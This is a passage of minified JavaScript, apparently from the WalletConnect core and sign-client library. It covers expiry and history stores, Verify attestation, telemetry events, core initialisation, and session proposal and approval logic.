e>"u"||!e.length)return;if(this.records.size){const{message:n}=V("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(St.created,e=>{const n=St.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.events.on(St.updated,e=>{const n=St.updated;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.events.on(St.deleted,e=>{const n=St.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.core.heartbeat.on(cr.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(n=>{z.toMiliseconds(n.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${n.id}`),this.records.delete(n.id),this.events.emit(St.deleted,n,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}}var mO=Object.defineProperty,wO=(t,e,n)=>e in t?mO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,qe=(t,e,n)=>wO(t,typeof e!="symbol"?e+"":e,n);class bO extends $m{constructor(e,n){super(e,n),this.core=e,this.logger=n,qe(this,"expirations",new Map),qe(this,"events",new Tt.EventEmitter),qe(this,"name",vD),qe(this,"version",ED),qe(this,"cached",[]),qe(this,"initialized",!1),qe(this,"storagePrefix",Vt),qe(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(r=>this.expirations.set(r.target,r)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),qe(this,"has",r=>{try{const i=this.formatTarget(r);return typeof this.getExpiration(i)<"u"}catch{return!1}}),qe(this,"set",(r,i)=>{this.isInitialized();const s=this.formatTarget(r),o={target:s,expiry:i};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(mt.created,{target:s,expiration:o})}),qe(this,"get",r=>{this.isInitialized();const i=this.formatTarget(r);return this.getExpiration(i)}),qe(this,"del",r=>{if(this.isInitialized(),this.has(r)){const i=this.formatTarget(r),s=this.getExpiration(i);this.expirations.delete(i),this.events.emit(mt.deleted,{target:i,expiration:s})}}),qe(this,"on",(r,i)=>{this.events.on(r,i)}),qe(this,"once",(r,i)=>{this.events.once(r,i)}),qe(this,"off",(r,i)=>{this.events.off(r,i)}),qe(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.logger=dt(n,this.name)}get context(){return ot(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return Xx(e);if(typeof e=="number")return Jx(e);const{message:n}=V("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(n)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(mt.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:n}=V("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const n=this.expirations.get(e);if(!n){const{message:r}=V("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(r),new Error(r)}return n}checkExpiry(e,n){const{expiry:r}=n;z.toMiliseconds(r)-Date.now()<=0&&this.expire(e,n)}expire(e,n){this.expirations.delete(e),this.events.emit(mt.expired,{target:e,expiration:n})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,n)=>this.checkExpiry(n,e))}registerEventListeners(){this.core.heartbeat.on(cr.pulse,()=>this.checkExpirations()),this.events.on(mt.created,e=>{const n=mt.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()}),this.events.on(mt.expired,e=>{const n=mt.expired;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()}),this.events.on(mt.deleted,e=>{const n=mt.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}}var vO=Object.defineProperty,EO=(t,e,n)=>e in t?vO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,me=(t,e,n)=>EO(t,typeof e!="symbol"?e+"":e,n);class xO extends Cm{constructor(e,n,r){super(e,n,r),this.core=e,this.logger=n,this.store=r,me(this,"name",xD),me(this,"abortController"),me(this,"isDevEnv"),me(this,"verifyUrlV3",ID),me(this,"storagePrefix",Vt),me(this,"version",Bg),me(this,"publicKey"),me(this,"fetchPromise"),me(this,"init",async()=>{var i;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&z.toMiliseconds((i=this.publicKey)==null?void 0:i.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),me(this,"register",async i=>{if(!zr()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=i,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const l=cn.getDocument(),u=this.startAbortTimer(z.ONE_SECOND*5),h=await new Promise((f,p)=>{const d=()=>{window.removeEventListener("message",w),l.body.removeChild(g),p("attestation aborted")};this.abortController.signal.addEventListener("abort",d);const g=l.createElement("iframe");g.src=c,g.style.display="none",g.addEventListener("error",d,{signal:this.abortController.signal});const w=_=>{if(_.data&&typeof _.data=="string")try{const C=JSON.parse(_.data);if(C.type==="verify_attestation"){if(Oa(C.attestation).payload.id!==o)return;clearInterval(u),l.body.removeChild(g),this.abortController.signal.removeEventListener("abort",d),window.removeEventListener("message",w),f(C.attestation===null?"":C.attestation)}}catch(C){this.logger.warn(C)}};l.body.appendChild(g),window.addEventListener("message",w,{signal:this.abortController.signal})});return this.logger.debug(h,"jwt attestation"),h}catch(l){this.logger.warn(l)}return""}),me(this,"resolve",async i=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=i;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(Oa(s).payload.id!==a)return;const l=await this.isValidJwtAttestation(s);if(l){if(!l.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return l}}if(!o)return;const c=this.getVerifyUrl(i?.verifyUrl);return this.fetchAttestation(o,c)}),me(this,"fetchAttestation",async(i,s)=>{this.logger.debug(`resolving attestation: ${i} from url: ${s}`);const o=this.startAbortTimer(z.ONE_SECOND*5),a=await fetch(`${s}/attestation/${i}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0}),me(this,"getVerifyUrl",i=>{let s=i||mi;return SD.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${mi}`),s=mi),s}),me(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const i=this.startAbortTimer(z.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(i),await s.json()}catch(i){this.logger.warn(i)}}),me(this,"persistPublicKey",async i=>{this.logger.debug(i,"persisting public key to local storage"),await this.store.setItem(this.storeKey,i),this.publicKey=i}),me(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),me(this,"isValidJwtAttestation",async i=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(i,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(i,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}}),me(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),me(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const i=await this.fetchPromise;return this.fetchPromise=void 0,i}),me(this,"validateAttestation",(i,s)=>{const o=GI(i,s.publicKey),a={hasExpired:z.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}}),this.logger=dt(n,this.name),this.abortController=new AbortController,this.isDevEnv=jc(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return ot(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),z.toMiliseconds(e))}}var _O=Object.defineProperty,IO=(t,e,n)=>e in t?_O(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,pf=(t,e,n)=>IO(t,typeof e!="symbol"?e+"":e,n);class SO extends Pm{constructor(e,n){super(e,n),this.projectId=e,this.logger=n,pf(this,"context",DD),pf(this,"registerDeviceToken",async r=>{const{clientId:i,token:s,notificationType:o,enableEncrypted:a=!1}=r,c=`${AD}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:i,type:o,token:s,always_raw:a})})}),this.logger=dt(n,this.context)}}var DO=Object.defineProperty,gf=Object.getOwnPropertySymbols,AO=Object.prototype.hasOwnProperty,OO=Object.prototype.propertyIsEnumerable,uc=(t,e,n)=>e in t?DO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,si=(t,e)=>{for(var n in e||(e={}))AO.call(e,n)&&uc(t,n,e[n]);if(gf)for(var n of gf(e))OO.call(e,n)&&uc(t,n,e[n]);return t},Ie=(t,e,n)=>uc(t,typeof e!="symbol"?e+"":e,n);class $O extends Tm{constructor(e,n,r=!0){super(e,n,r),this.core=e,this.logger=n,Ie(this,"context",$D),Ie(this,"storagePrefix",Vt),Ie(this,"storageVersion",OD),Ie(this,"events",new Map),Ie(this,"shouldPersist",!1),Ie(this,"init",async()=>{if(!jc())try{const i={eventId:Yu(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:xp(this.core.relayer.protocol,this.core.relayer.version,nc)}}};await this.sendEvent([i])}catch(i){this.logger.warn(i)}}),Ie(this,"createEvent",i=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=i,l=Yu(),u=this.core.projectId||"",h=Date.now(),f=si({eventId:l,timestamp:h,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:u,domain:this.getAppDomain()},this.setMethods(l));return this.telemetryEnabled&&(this.events.set(l,f),this.shouldPersist=!0),f}),Ie(this,"getEvent",i=>{const{eventId:s,topic:o}=i;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return si(si({},a),this.setMethods(a.eventId))}),Ie(this,"deleteEvent",i=>{const{eventId:s}=i;this.events.delete(s),this.shouldPersist=!0}),Ie(this,"setEventListeners",()=>{this.core.heartbeat.on(cr.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(i=>{z.fromMiliseconds(Date.now())-z.fromMiliseconds(i.timestamp)>CD&&(this.events.delete(i.eventId),this.shouldPersist=!0)})})}),Ie(this,"setMethods",i=>({addTrace:s=>this.addTrace(i,s),setError:s=>this.setError(i,s)})),Ie(this,"addTrace",(i,s)=>{const o=this.events.get(i);o&&(o.props.properties.trace.push(s),this.events.set(i,o),this.shouldPersist=!0)}),Ie(this,"setError",(i,s)=>{const o=this.events.get(i);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(i,o),this.shouldPersist=!0)}),Ie(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),Ie(this,"restore",async()=>{try{const i=await this.core.storage.getItem(this.storageKey)||[];if(!i.length)return;i.forEach(s=>{this.events.set(s.eventId,si(si({},s),this.setMethods(s.eventId)))})}catch(i){this.logger.warn(i)}}),Ie(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const i=[];for(const[s,o]of this.events)o.props.type&&i.push(o);if(i.length!==0)try{if((await this.sendEvent(i)).ok)for(const s of i)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}}),Ie(this,"sendEvent",async i=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${PD}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${nc}${s}`,{method:"POST",body:JSON.stringify(i)})}),Ie(this,"getAppDomain",()=>Ep().url),this.logger=dt(n,this.context),this.telemetryEnabled=r,r?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}}var CO=Object.defineProperty,yf=Object.getOwnPropertySymbols,PO=Object.prototype.hasOwnProperty,TO=Object.prototype.propertyIsEnumerable,hc=(t,e,n)=>e in t?CO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,mf=(t,e)=>{for(var n in e||(e={}))PO.call(e,n)&&hc(t,n,e[n]);if(yf)for(var n of yf(e))TO.call(e,n)&&hc(t,n,e[n]);return t},le=(t,e,n)=>hc(t,typeof e!="symbol"?e+"":e,n);class tl extends bm{constructor(e){var n;super(e),le(this,"protocol",Tg),le(this,"version",Bg),le(this,"name",tc),le(this,"relayUrl"),le(this,"projectId"),le(this,"customStoragePrefix"),le(this,"events",new Tt.EventEmitter),le(this,"logger"),le(this,"heartbeat"),le(this,"relayer"),le(this,"crypto"),le(this,"storage"),le(this,"history"),le(this,"expirer"),le(this,"pairing"),le(this,"verify"),le(this,"echoClient"),le(this,"linkModeSupportedApps"),le(this,"eventClient"),le(this,"initialized",!1),le(this,"logChunkController"),le(this,"on",(a,c)=>this.events.on(a,c)),le(this,"once",(a,c)=>this.events.once(a,c)),le(this,"off",(a,c)=>this.events.off(a,c)),le(this,"removeListener",(a,c)=>this.events.removeListener(a,c)),le(this,"dispatchEnvelope",({topic:a,message:c,sessionExists:l})=>{if(!a||!c)return;const u={topic:a,message:c,publishedAt:Date.now(),transportType:he.link_mode};this.relayer.onLinkMessageEvent(u,{sessionExists:l})});const r=this.getGlobalCore(e?.customStoragePrefix);if(r)try{return this.customStoragePrefix=r.customStoragePrefix,this.logger=r.logger,this.heartbeat=r.heartbeat,this.crypto=r.crypto,this.history=r.history,this.expirer=r.expirer,this.storage=r.storage,this.relayer=r.relayer,this.pairing=r.pairing,this.verify=r.verify,this.echoClient=r.echoClient,this.linkModeSupportedApps=r.linkModeSupportedApps,this.eventClient=r.eventClient,this.initialized=r.initialized,this.logChunkController=r.logChunkController,r}catch(a){console.warn("Failed to copy global core",a)}this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||kg,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const i=fm({level:typeof e?.logger=="string"&&e.logger?e.logger:JS.logger,name:tc}),{logger:s,chunkLoggerController:o}=Yf({opts:i,maxSizeInBytes:e?.maxLogBlobSizeInBytes,loggerOverride:e?.logger});this.logChunkController=o,(n=this.logChunkController)!=null&&n.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var a,c;(a=this.logChunkController)!=null&&a.downloadLogsBlobInBrowser&&((c=this.logChunkController)==null||c.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=dt(s,this.name),this.heartbeat=new c0,this.crypto=new oA(this,this.logger,e?.keychain),this.history=new yO(this,this.logger),this.expirer=new bO(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new V0(mf(mf({},QS),e?.storageOptions)),this.relayer=new BA({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new dO(this,this.logger),this.verify=new xO(this,this.logger,this.storage),this.echoClient=new SO(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new $O(this,this.logger,e?.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const n=new tl(e);await n.initialize();const r=await n.crypto.getClientId();return await n.storage.setItem(dD,r),n}get context(){return ot(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(Gh,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(Gh)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(e,`Core Initialization Failure at epoch ${Date.now()}`),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const n=`_walletConnectCore_${e}`,r=`${n}_count`;return globalThis[r]=(globalThis[r]||0)+1,globalThis[r]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[r]} times.`),globalThis[n]}catch(n){console.warn("Failed to get global WalletConnect core",n);return}}setGlobalCore(e){var n;try{if(this.isGlobalCoreDisabled())return;const r=`_walletConnectCore_${((n=e.opts)==null?void 0:n.customStoragePrefix)||""}`;globalThis[r]=e}catch(r){console.warn("Failed to set global WalletConnect core",r)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&XS.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}}const BO=tl,Gg="wc",Yg=2,Zg="client",nl=`${Gg}@${Yg}:${Zg}:`,ha={name:Zg,logger:"error"},wf="WALLETCONNECT_DEEPLINK_CHOICE",RO="proposal",bf="Proposal expired",kO="session",_r=z.SEVEN_DAYS,NO="engine",Be={wc_sessionPropose:{req:{ttl:z.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:z.ONE_DAY,prompt:!1,tag:1104},res:{ttl:z.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:z.ONE_DAY,prompt:!1,tag:1106},res:{ttl:z.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:z.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:z.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:z.ONE_DAY,prompt:!1,tag:1112},res:{ttl:z.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:z.ONE_DAY,prompt:!1,tag:1114},res:{ttl:z.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:z.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:z.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:z.FIVE_MINUTES,prompt:!1,tag:1119}}},fa={min:z.FIVE_MINUTES,max:z.SEVEN_DAYS},Ut={idle:"IDLE",active:"ACTIVE"},UO={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"},sui_signAndExecuteTransaction:{key:"digest"},sui_signTransaction:{key:""},hedera_signAndExecuteTransaction:{key:"transactionId"},hedera_executeTransaction:{key:"transactionId"},near_signTransaction:{key:""},near_signTransactions:{key:""},tron_signTransaction:{key:"txID"},xrpl_signTransaction:{key:""},xrpl_signTransactionFor:{key:""},algo_signTxn:{key:""},sendTransfer:{key:"txid"},stacks_stxTransfer:{key:"txId"},polkadot_signTransaction:{key:""},cosmos_signDirect:{key:""}},MO="request",LO=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],FO="wc",jO="auth",qO="authKeys",zO="pairingTopics",VO="requests",co=`${FO}@${1.5}:${jO}:`,ys=`${co}:PUB_KEY`;var WO=Object.defineProperty,KO=Object.defineProperties,HO=Object.getOwnPropertyDescriptors,vf=Object.getOwnPropertySymbols,GO=Object.prototype.hasOwnProperty,YO=Object.prototype.propertyIsEnumerable,fc=(t,e,n)=>e in t?WO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ie=(t,e)=>{for(var n in e||(e={}))GO.call(e,n)&&fc(t,n,e[n]);if(vf)for(var n of vf(e))YO.call(e,n)&&fc(t,n,e[n]);return t},Re=(t,e)=>KO(t,HO(e)),F=(t,e,n)=>fc(t,typeof e!="symbol"?e+"":e,n);class ZO extends Nm{constructor(e){super(e),F(this,"name",NO),F(this,"events",new qf),F(this,"initialized",!1),F(this,"requestQueue",{state:Ut.idle,queue:[]}),F(this,"sessionRequestQueue",{state:Ut.idle,queue:[]}),F(this,"emittedSessionRequests",new a3({limit:500})),F(this,"requestQueueDelay",z.ONE_SECOND),F(this,"expectedPairingMethodMap",new Map),F(this,"recentlyDeletedMap",new Map),F(this,"recentlyDeletedLimit",200),F(this,"relayMessageCache",[]),F(this,"pendingSessions",new Map),F(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(Be)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},z.toMiliseconds(this.requestQueueDelay)))}),F(this,"connect",async n=>{var r;this.isInitialized(),await this.confirmOnlineStateOrThrow();const i=Re(ie({},n),{requiredNamespaces:n.requiredNamespaces||{},optionalNamespaces:n.optionalNamespaces||{}});await this.isValidConnect(i),i.optionalNamespaces=w8(i.requiredNamespaces,i.optionalNamespaces),i.requiredNamespaces={};const{pairingTopic:s,requiredNamespaces:o,optionalNamespaces:a,sessionProperties:c,scopedProperties:l,relays:u,authentication:h,walletPay:f}=i,p=((r=h?.[0])==null?void 0:r.ttl)||Be.wc_sessionPropose.req.ttl||z.FIVE_MINUTES;this.validateRequestExpiry(p);let d=s,g,w=!1;try{if(d){const $=this.client.core.pairing.pairings.get(d);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),w=$.active}}catch($){throw this.client.logger.error(`connect() -> pairing.get(${d}) failed`),$}if(!d||!w){const{topic:$,uri:N}=await this.client.core.pairing.create({internal:{skipSubscribe:!0}});d=$,g=N}if(!d){const{message:$}=V("NO_MATCHING_KEY",`connect() pairing topic: ${d}`);throw new Error($)}const _=await this.client.core.crypto.generateKeyPair(),C=Ee(p),v=ie(Re(ie(ie({requiredNamespaces:o,optionalNamespaces:a,relays:u??[{protocol:Rg}],proposer:{publicKey:_,metadata:this.client.metadata},expiryTimestamp:C,pairingTopic:d},c&&{sessionProperties:c}),l&&{scopedProperties:l}),{id:jt()}),(h||f)&&{requests:{authentication:h?.map($=>{const{domain:N,chains:E,nonce:S,uri:D,exp:P,nbf:y,type:m,statement:I,requestId:T,resources:A,signatureTypes:R}=$;return{domain:N,chains:E,nonce:S,type:m??"caip122",aud:D,version:"1",iat:new Date().toISOString(),exp:P,nbf:y,statement:I,requestId:T,resources:A,signatureTypes:R}}),walletPay:f}}),b=oe("session_connect",v.id),{reject:x,resolve:O,done:B}=Vn(p,bf),k=({id:$})=>{$===v.id&&(this.client.events.off("proposal_expire",k),this.pendingSessions.delete(v.id),this.events.emit(b,{error:{message:bf,code:0}}))};return this.client.events.on("proposal_expire",k),this.events.once(b,({error:$,session:N})=>{this.client.events.off("proposal_expire",k),$?x($):N&&O(N)}),await this.setProposal(v.id,v),await this.sendProposeSession({proposal:v,publishOpts:{internal:{throwOnFailedPublish:!0},tvf:{correlationId:v.id}}}).catch($=>{throw this.deleteProposal(v.id),$}),{uri:g,approval:B}}),F(this,"pair",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(n)}catch(r){throw this.client.logger.error("pair() failed"),r}}),F(this,"approve",async n=>{var r,i,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(r=n?.id)==null?void 0:r.toString(),trace:[Dt.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(N){throw o.setError(Fn.no_internet_connection),N}try{await this.isValidProposalId(n?.id)}catch(N){throw this.client.logger.error(`approve() -> proposal.get(${n?.id}) failed`),o.setError(Fn.proposal_not_found),N}try{await this.isValidApprove(n)}catch(N){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(Fn.session_approve_namespace_validation_failure),N}const{id:a,relayProtocol:c,namespaces:l,sessionProperties:u,scopedProperties:h,sessionConfig:f,proposalRequestsResponses:p}=n,d=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:g,proposer:w,requiredNamespaces:_,optionalNamespaces:C}=d;let v=(i=this.client.core.eventClient)==null?void 0:i.getEvent({topic:g});v||(v=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:Dt.session_approve_started,properties:{topic:g,trace:[Dt.session_approve_started,Dt.session_namespaces_validation_success]}}));const b=await this.client.core.crypto.generateKeyPair(),x=w.publicKey,O=await this.client.core.crypto.generateSharedKey(b,x),B=Re(ie(ie(ie({relay:{protocol:c??"irn"},namespaces:l,controller:{publicKey:b,metadata:this.client.metadata},expiry:Ee(_r)},u&&{sessionProperties:u}),h&&{scopedProperties:h}),f&&{sessionConfig:f}),{proposalRequestsResponses:p}),k=he.relay;v.addTrace(Dt.subscribing_session_topic);try{await this.client.core.relayer.subscribe(O,{transportType:k,internal:{skipSubscribe:!0}})}catch(N){throw v.setError(Fn.subscribe_session_topic_failure),N}v.addTrace(Dt.subscribe_session_topic_success);const $=Re(ie({},B),{topic:O,requiredNamespaces:_,optionalNamespaces:C,pairingTopic:g,acknowledged:!1,self:B.controller,peer:{publicKey:w.publicKey,metadata:w.metadata},controller:b,transportType:he.relay,authentication:p?.authentication,walletPayResult:p?.walletPay});await this.client.session.set(O,$),v.addTrace(Dt.store_session);try{await this.sendApproveSession({sessionTopic:O,proposal:d,pairingProposalResponse:{relay:{protocol:c??"irn"},responderPublicKey:b},sessionSettleRequest:B,publishOpts:{internal:{throwOnFailedPublish:!0},tvf:ie({correlationId:a},this.getTVFApproveParams($))}}),v.addTrace(Dt.session_approve_publish_success)}catch(N){throw this.client.logger.error(N),this.client.session.delete(O,de("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(O),N}return this.client.core.eventClient.deleteEvent({eventId:v.eventId}),await this.client.core.pairing.updateMetadata({topic:g,metadata:w.metadata}),await this.deleteProposal(a),await this.client.core.pairing.activate({topic:g}),await this.setExpiry(O,Ee(_r)),{topic:O,acknowledged:()=>Promise.resolve(this.client.session.get(O))}}),F(this,"reject",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(n)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:r,reason:i}=n;let s;try{s=this.client.proposal.get(r).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${r}) failed`),o}s&&await this.sendError({id:r,topic:s,error:i,rpcOpts:Be.wc_sessionPropose.reject}),await this.deleteProposal(r)}),F(this,"update",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(n)}catch(h){throw this.client.logger.error("update() -> isValidUpdate() failed"),h}const{topic:r,namespaces:i}=n,{done:s,resolve:o,reject:a}=Vn(z.FIVE_MINUTES,"Session update request expired without receiving any acknowledgement"),c=jt(),l=On().toString(),u=this.client.session.get(r).namespaces;return this.events.once(oe("session_update",c),({error:h})=>{h?a(h):o()}),await this.client.session.update(r,{namespaces:i}),await this.sendRequest({topic:r,method:"wc_sessionUpdate",params:{namespaces:i},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:l}).catch(h=>{this.client.logger.error(h),this.client.session.update(r,{namespaces:u}),a(h)}),{acknowledged:s}}),F(this,"extend",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(n)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:r}=n,i=jt(),{done:s,resolve:o,reject:a}=Vn(z.FIVE_MINUTES,"Session extend request expired without receiving any acknowledgement");return this.events.once(oe("session_extend",i),({error:c})=>{c?a(c):o()}),await 